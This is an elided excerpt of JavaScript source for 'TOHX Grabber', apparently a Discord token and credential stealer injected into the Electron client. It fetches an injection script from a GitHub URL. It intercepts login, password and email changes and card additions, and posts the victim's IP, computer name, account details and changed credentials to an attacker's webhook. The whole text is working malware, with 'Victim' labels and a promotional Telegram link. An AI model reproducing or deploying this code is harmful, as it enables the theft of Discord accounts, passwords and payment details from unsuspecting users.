...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/AlphaTools-dev/iject/main/injection.js",
    webhook: "%WEBHOOK%",
...
const makeEmbed = async ({
    ...
    var params = {
        username: "TOHX Grabber",
        avatar_url: "https://cdn.discordapp.com/attachments/1063813362380701736/1077635893231370331/lodho.png",
        content: "",
        embeds: [{
            title: title,
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[TOHX Grabber 2023 <:tohxcleaikjkkn:1033345269091287050>](https://t.me/tohxgb)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "TOHX Grabber User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "TOHX Grabber Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "TOHX Grabber User Login",
                description: "[<:tohxcleaikjkkn:1033345269091287050>  **Oh you have TOHX Grabber someone**](https://t.me/tohxgb)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "TOHX Grabber Detect Password Changed",
                    description: "[<:tohxcleaikjkkn:1033345269091287050>  **Oh you have TOHX Grabber someone**](https://t.me/tohxgb)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        ...
                        name: "Bio <:tohxcleaikjkkn:1033345269091287050>",
                        value: `\`${user.bio ?? "None"}\``,
                        inline: !0
                    }, {
                        name: "Nitro <a:nitro:1041639670288748634>",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "TOHX Grabber Detect Email Changed",
                    description: "[<:tohxcleaikjkkn:1033345269091287050>  **Oh you have TOHX Grabber someone**](https://t.me/tohxgb)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "TOHX Grabber User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
